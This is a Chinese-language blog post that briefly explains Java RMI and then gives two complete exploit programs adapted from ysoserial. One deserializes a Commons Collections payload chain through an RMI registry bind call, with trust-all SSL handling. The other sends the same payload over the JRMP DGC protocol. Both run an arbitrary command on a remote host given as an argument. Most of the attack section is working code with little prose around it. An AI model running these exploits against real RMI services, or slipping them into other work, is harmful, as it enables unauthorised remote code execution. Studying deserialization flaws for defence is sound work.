## RMI介绍

远程方法调用，调用图如下

![image-20240608170028754](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240608170028754.png)

简单概括就是客户端和服务端的通信是经过了Stub(客户类)，Skeleton(服务端类)进行传递的，并非直接传输

能够远程调用的接口都需要继承`java.rmi.Remote` 接口，用来远程调用的对象作为这个接口的实例，也将实现这个接口，为这个接口生成的代理（Stub）也是如此。这个接口中的所有方法都必须声明抛出 `java.rmi.RemoteException` 异常。

+  register

  ```java
  import java.rmi.Naming;
  import java.rmi.registry.LocateRegistry;
  
  public class RMIServerTest {
  
     // RMI服务器IP地址
     public static final String RMI_HOST = "127.0.0.1";
  
     // RMI服务端口
     public static final int RMI_PORT = 9527;
  
     // RMI服务名称
     public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/test";
  
     public static void main(String[] args) {
        try {
           // 注册RMI端口
           LocateRegistry.createRegistry(RMI_PORT);
  
           // 绑定Remote对象
           Naming.bind(RMI_NAME, new RMITestImpl());
  
           System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
        } catch (Exception e) {
           e.printStackTrace();
        }
     }
  
  }
  ```

  `Naming.bind(RMI_NAME, new RMITestImpl())`绑定的是服务端的一个类实例，`RMI客户端`需要有这个实例的接口代码(`RMITestInterface.java`)，`RMI客户端`调用服务器端的`RMI服务`时会返回这个服务所绑定的对象引用，`RMI客户端`可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。

+ rmi接口

  这个接口并没有实现任何方法，方法的实现在服务端

  ```java
  import java.rmi.Remote;
  import java.rmi.RemoteException;
  
  /**
   * RMI测试接口
   */
  public interface RMITestInterface extends Remote {
  
     /**
      * RMI测试方法
      *
      * @return 返回测试字符串
      */
     String test() throws RemoteException;
  
  }
  ```

+ 服务端

  ```java
  import java.rmi.RemoteException;
  import java.rmi.server.UnicastRemoteObject;
  
  public class RMITestImpl extends UnicastRemoteObject implements RMITestInterface {
  
     private static final long serialVersionUID = 1L;
  
     protected RMITestImpl() throws RemoteException {
        super();
     }
  
     /**
      * RMI测试方法
      *
      * @return 返回测试字符串
      */
     @Override
     public String test() throws RemoteException {
        return "Hello RMI~";
     }
  
  }
  ```

+ 客户端

  ```java
  import java.rmi.Naming;
  
  import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;
  
  public class RMIClientTest {
  
     public static void main(String[] args) {
        try {
           // 查找远程RMI服务
           RMITestInterface rt = (RMITestInterface) Naming.lookup(RMI_NAME);
  
           // 调用远程接口RMITestInterface类的test方法
           String result = rt.test();
  
           // 输出RMI方法调用结果
           System.out.println(result);
        } catch (Exception e) {
           e.printStackTrace();
        }
     }
  }
  ```

以上代码实现了简单的rmi客户端和服务端之间的通信

![image-20240608173036756](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240608173036756.png)

rmi支持动态类加载，如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 `java.rmi.server.codebase`，则会尝试从其中的地址获取 `.class` 并加载及反序列化。

## 反序列化

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;

import static org.example.RMIServerTest.RMI_HOST;
import static org.example.RMIServerTest.RMI_PORT;

/**
 * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
 *
 * @author yz
 */
public class RMIExploit {

    // 定义AnnotationInvocationHandler类常量
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    /**
     * 信任SSL证书
     */
    private static class TrustAllSSL implements X509TrustManager {

        private static final X509Certificate[] ANY_CA = {};

        public X509Certificate[] getAcceptedIssuers() {
            return ANY_CA;
        }

        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

    }

    /**
     * 创建支持SSL的RMI客户端
     */
    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {

        public Socket createSocket(String host, int port) throws IOException {
            try {
                // 获取SSLContext对象
                SSLContext ctx = SSLContext.getInstance("TLS");

                // 默认信任服务器端SSL
                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);

                // 获取SSL Socket连接工厂
                SSLSocketFactory factory = ctx.getSocketFactory();

                // 创建SSL连接
                return factory.createSocket(host, port);
            } catch (Exception e) {
                throw new IOException(e);
            }
        }
    }

    /**
     * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
     *
     * @param command 定义需要执行的CMD
     * @return Payload
     * @throws Exception 生成Payload异常
     */
    private static InvocationHandler genPayload(String command) throws Exception {
        // 创建Runtime.getRuntime.exec(cmd)调用链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

        // 获取AnnotationInvocationHandler类对象
        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        // 实例化AnnotationInvocationHandler，
        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        // 使用动态代理创建出Map类型的Payload
        final Map mapProxy2 = (Map) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
        );

        // 实例化AnnotationInvocationHandler，
        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
    }

    /**
     * 执行Payload
     *
     * @param registry RMI Registry
     * @param command  需要执行的命令
     * @throws Exception Payload执行异常
     */
    public static void exploit(final Registry registry, final String command) throws Exception {
        // 生成Payload动态代理对象
        Object payload = genPayload(command);
        String name    = "test" + System.nanoTime();

        // 创建一个含有Payload的恶意map
        Map<String, Object> map = new HashMap();
        map.put(name, payload);

        // 获取AnnotationInvocationHandler类对象
        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        // 实例化AnnotationInvocationHandler，
        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

        // 使用动态代理创建出Remote类型的Payload
        Remote remote = (Remote) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
        );

        try {
            // 发送Payload
            registry.bind(name, remote);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            // 如果不指定连接参数默认连接本地RMI服务
            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "calc"};
        }

        // 远程RMI服务IP
        final String host = args[0];

        // 远程RMI服务端口
        final int port = Integer.parseInt(args[1]);

        // 需要执行的系统命令
        final String command = args[2];

        // 获取远程Registry对象的引用
        Registry registry = LocateRegistry.getRegistry(host, port);

        try {
            // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
            String[] regs = registry.list();

            for (String reg : regs) {
                System.out.println("RMI:" + reg);
            }
        } catch (ConnectIOException ex) {
            // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
        }

        // 执行payload
        exploit(registry, command);
    }

}

```

[来源于](https://javasec.org/javase/RMI/)

## JRMP反序列化

`JRMP`接口的两种常见实现方式：

1. `JRMP协议(Java Remote Message Protocol)`，`RMI`专用的`Java远程消息交换协议`。
2. `IIOP协议(Internet Inter-ORB Protocol)` ，基于 `CORBA` 实现的对象请求代理协议。

以通过和`RMI服务`端建立`Socket`连接并使用`RMI`的`JRMP`协议发送恶意的序列化包，`RMI服务端`在处理`JRMP`消息时会反序列化消息对象，从而实现`RCE`。

```java
package org.example;

import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import static org.example.RMIServerTest.RMI_HOST;
import static org.example.RMIServerTest.RMI_PORT;

/**
 * 利用RMI的JRMP协议发送恶意的序列化包攻击示例，该示例采用Socket协议发送序列化数据，不会反序列化RMI服务器端的数据，
 * 所以不用担心本地被RMI服务端通过构建恶意数据包攻击，示例程序修改自ysoserial的JRMPClient：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java
 */
public class JRMPExploit {

    public static void main(String[] args) throws IOException {
        if (args.length == 0) {
            // 如果不指定连接参数默认连接本地RMI服务
            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "calc"};
        }
        Registry registry = LocateRegistry.getRegistry(RMI_HOST, RMI_PORT);
        // 远程RMI服务IP
        final String host = args[0];

        // 远程RMI服务端口
        final int port = Integer.parseInt(args[1]);

        // 需要执行的系统命令
        final String command = args[2];
        try {
            // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
            String[] regs = registry.list();

            for (String reg : regs) {
                System.out.println("RMI:" + reg);
            }
        } catch (ConnectIOException ex) {
            // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
            registry = LocateRegistry.getRegistry(host, port, new RMIExploit.RMISSLClientSocketFactory());
        }
        // Socket连接对象
        Socket socket = null;

        // Socket输出流
        OutputStream out = null;

        try {
            // 创建恶意的Payload对象
            Object payloadObject = RMIExploit.genPayload(command);

            // 建立和远程RMI服务的Socket连接
            socket = new Socket(host, port);
            socket.setKeepAlive(true);
            socket.setTcpNoDelay(true);

            // 获取Socket的输出流对象
            out = socket.getOutputStream();

            // 将Socket的输出流转换成DataOutputStream对象
            DataOutputStream dos = new DataOutputStream(out);

            // 创建MarshalOutputStream对象
            ObjectOutputStream baos = new MarshalOutputStream(dos);

            // 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象
            dos.writeInt(TransportConstants.Magic);// 魔数
            dos.writeShort(TransportConstants.Version);// 版本
            dos.writeByte(TransportConstants.SingleOpProtocol);// 协议类型
            dos.write(TransportConstants.Call);// RMI调用指令
            baos.writeLong(2); // DGC
            baos.writeInt(0);
            baos.writeLong(0);
            baos.writeShort(0);
            baos.writeInt(1); // dirty
            baos.writeLong(-669196253586618813L);// 接口Hash值

            // 写入恶意的序列化对象
            baos.writeObject(payloadObject);

            dos.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // 关闭Socket输出流
            if (out != null) {
                out.close();
            }

            // 关闭Socket连接
            if (socket != null) {
                socket.close();
            }
        }
    }


}
```

